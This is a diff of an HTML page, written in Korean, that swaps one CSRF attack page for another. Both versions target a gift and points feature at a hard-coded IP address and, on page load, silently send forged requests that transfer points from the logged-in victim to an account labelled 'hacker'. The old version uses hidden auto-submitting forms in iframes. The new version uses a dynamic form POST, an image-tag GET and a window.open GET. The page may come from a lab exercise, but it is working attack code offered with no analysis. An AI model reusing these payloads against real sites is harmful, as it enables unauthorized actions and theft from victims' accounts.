@@ -2,185 +2,81 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>🎯 정확한 CSRF 공격</title>
-    <style>
-        body { 
-            font-family: Arial; 
-            padding: 30px;
-            background: linear-gradient(135deg, #ff9a9e, #fecfef);
-            color: #333;
-            text-align: center;
-        }
-        .attack-box {
-            background: rgba(255, 255, 255, 0.95);
-            border: 3px solid #ff6b6b;
-            padding: 40px;
-            margin: 20px auto;
-            border-radius: 20px;
-            max-width: 700px;
-            box-shadow: 0 0 20px rgba(255, 107, 107, 0.3);
-        }
-        .status {
-            background: #f8f9fa;
-            border-left: 4px solid #28a745;
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 5px;
-        }
-        .attack-item {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
-        }
-    </style>
+    <title>🔥 최종 CSRF 우회</title>
 </head>
 <body>
-    <div class="attack-box">
-        <h1>🎯 정밀 CSRF 공격 실행</h1>
-        <h2>📊 Network 분석 완료 - 실제 파라미터 사용</h2>
-        
-        <div id="status" class="status">
-            🔍 분석된 파라미터로 공격 준비 중...
-        </div>
-        
-        <div id="attacks"></div>
-        <div id="results"></div>
-    </div>
-
-    <!-- 정확한 폼 구조로 숨겨진 공격 폼들 -->
-    <form id="attack1" action="http://3.36.66.216/profile.php?gift_to=13" method="POST" target="frame1" style="display:none;">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="gift_type" value="coffee">
-        <input type="hidden" name="points" value="100">
-        <input type="hidden" name="message" value="생일축하해!">
-    </form>
-
-    <form id="attack2" action="http://3.36.66.216/profile.php?gift_to=13" method="POST" target="frame2" style="display:none;">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="gift_type" value="flower">
-        <input type="hidden" name="points" value="150">
-        <input type="hidden" name="message" value="꽃선물이야~">
-    </form>
-
-    <form id="attack3" action="http://3.36.66.216/profile.php?gift_to=13" method="POST" target="frame3" style="display:none;">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="gift_type" value="cake">
-        <input type="hidden" name="points" value="200">
-        <input type="hidden" name="message" value="케이크먹어">
-    </form>
-
-    <form id="attack4" action="http://3.36.66.216/profile.php?gift_to=13" method="POST" target="frame4" style="display:none;">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="gift_type" value="diamond">
-        <input type="hidden" name="points" value="250">
-        <input type="hidden" name="message" value="다이아몬드!">
-    </form>
-
-    <form id="attack5" action="http://3.36.66.216/profile.php?gift_to=13" method="POST" target="frame5" style="display:none;">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="gift_type" value="coffee">
-        <input type="hidden" name="points" value="300">
-        <input type="hidden" name="message" value="또보내!">
-    </form>
-
-    <!-- 숨겨진 iframe들 -->
-    <iframe name="frame1" style="display:none;"></iframe>
-    <iframe name="frame2" style="display:none;"></iframe>
-    <iframe name="frame3" style="display:none;"></iframe>
-    <iframe name="frame4" style="display:none;"></iframe>
-    <iframe name="frame5" style="display:none;"></iframe>
-
+    <h1>🎯 최종 CSRF 공격</h1>
+    <div id="status">공격 준비 중...</div>
+    
     <script>
-        let attackCount = 0;
-        let totalAttacks = 5;
-        let totalPoints = 0;
-
-        const attacks = [
-            {id: 'attack1', type: 'coffee', points: 100, message: '생일축하해!'},
-            {id: 'attack2', type: 'flower', points: 150, message: '꽃선물이야~'},
-            {id: 'attack3', type: 'cake', points: 200, message: '케이크먹어'},
-            {id: 'attack4', type: 'diamond', points: 250, message: '다이아몬드!'},
-            {id: 'attack5', type: 'coffee', points: 300, message: '또보내!'}
-        ];
-
-        function updateStatus(message) {
-            document.getElementById('status').innerHTML = message;
-        }
-
-        function updateAttacks() {
-            let html = '<h3>🚀 실행 중인 공격들:</h3>';
-            attacks.forEach((attack, index) => {
-                let status = '';
-                if (index < attackCount) status = ' ✅ 완료';
-                else if (index === attackCount) status = ' 🔄 진행중';
-                else status = ' ⏳ 대기';
-                
-                html += `<div class="attack-item">
-                    ${attack.type} 선물 (${attack.points}P) → hacker${status}
-                </div>`;
+        // 1. 현재 도메인에서 직접 요청 (Same-Origin)
+        function directFormSubmit() {
+            // 동적으로 폼 생성
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://3.36.66.216/profile.php?gift_to=13';
+            form.target = '_blank'; // 새 창에서 열기
+            
+            // 필요한 필드들 추가
+            const fields = {
+                'send_gift': '1',
+                'receiver_id': '13', 
+                'gift_type': 'coffee',
+                'points': '500',
+                'message': 'CSRF테스트'
+            };
+            
+            Object.keys(fields).forEach(key => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = fields[key];
+                form.appendChild(input);
             });
-            document.getElementById('attacks').innerHTML = html;
+            
+            document.body.appendChild(form);
+            
+            // 즉시 제출
+            form.submit();
+            
+            document.getElementById('status').innerHTML = '🚀 폼 제출 완료! 새 창 확인하세요.';
+            console.log('CSRF 공격 폼 제출됨');
         }
-
-        function updateResults() {
-            document.getElementById('results').innerHTML = `
-                <div class="status">
-                    <h3>📊 현재 진행상황</h3>
-                    <p><strong>완료된 공격:</strong> ${attackCount}/${totalAttacks}</p>
-                    <p><strong>전송 포인트:</strong> ${totalPoints}P</p>
-                    <p><strong>대상:</strong> hacker (ID: 13)</p>
-                    <p><strong>공격자:</strong> bob (현재 로그인 사용자)</p>
-                </div>
+        
+        // 2. 이미지 태그로 GET 요청 시도
+        function imageBasedAttack() {
+            const img = new Image();
+            img.src = 'http://3.36.66.216/profile.php?send_gift=1&receiver_id=13&gift_type=flower&points=100&message=imgattack&gift_to=13&_=' + Date.now();
+            
+            img.onload = () => console.log('이미지 공격 성공');
+            img.onerror = () => console.log('이미지 공격 시도됨 (에러는 정상)');
+            
+            document.body.appendChild(img);
+        }
+        
+        // 3. 새 창에서 직접 이동
+        function windowOpenAttack() {
+            const url = 'http://3.36.66.216/profile.php?send_gift=1&receiver_id=13&gift_type=cake&points=200&message=newwindow&gift_to=13';
+            window.open(url, 'csrf_attack', 'width=800,height=600');
+        }
+        
+        // 페이지 로드 시 모든 공격 실행
+        window.onload = function() {
+            console.log('🔥 최종 CSRF 공격 시작');
+            
+            // 1초 간격으로 다양한 방법 시도
+            setTimeout(directFormSubmit, 1000);
+            setTimeout(imageBasedAttack, 3000);
+            setTimeout(windowOpenAttack, 5000);
+            
+            // 수동 버튼도 추가
+            document.body.innerHTML += `
+                <br><br>
+                <button onclick="directFormSubmit()">수동 폼 제출</button>
+                <button onclick="imageBasedAttack()">이미지 공격</button>
+                <button onclick="windowOpenAttack()">새창 공격</button>
             `;
-        }
-
-        function executeAttack(attackIndex, delay) {
-            setTimeout(() => {
-                const attack = attacks[attackIndex];
-                document.getElementById(attack.id).submit();
-                
-                attackCount++;
-                totalPoints += attack.points;
-                
-                updateStatus(`🚀 ${attack.type} 선물 (${attack.points}P) 전송 완료!`);
-                updateAttacks();
-                updateResults();
-                
-                console.log(`[CSRF] 공격 ${attackCount}: ${attack.type} → ID=13, ${attack.points}P`);
-                
-                if (attackCount === totalAttacks) {
-                    setTimeout(() => {
-                        updateStatus(`
-                            🎉 모든 CSRF 공격 완료!<br>
-                            💰 총 ${totalPoints}P가 hacker에게 전송되었습니다!<br>
-                            🔍 지금 포인트 변화를 확인해보세요!
-                        `);
-                    }, 1000);
-                }
-            }, delay);
-        }
-
-        // 페이지 로드 후 자동 실행
-        window.addEventListener('load', function() {
-            updateStatus('🔥 정밀 CSRF 공격 시작...');
-            updateAttacks();
-            updateResults();
-            
-            // 5개 공격을 2초 간격으로 순차 실행
-            attacks.forEach((attack, index) => {
-                executeAttack(index, (index + 1) * 2000);
-            });
-            
-            console.log('🎯 Network 분석 기반 CSRF 공격 시작됨');
-            console.log('📋 사용된 파라미터: send_gift=1, receiver_id=13, gift_type, points, message');
-        });
+        };
     </script>
 </body>
 </html>
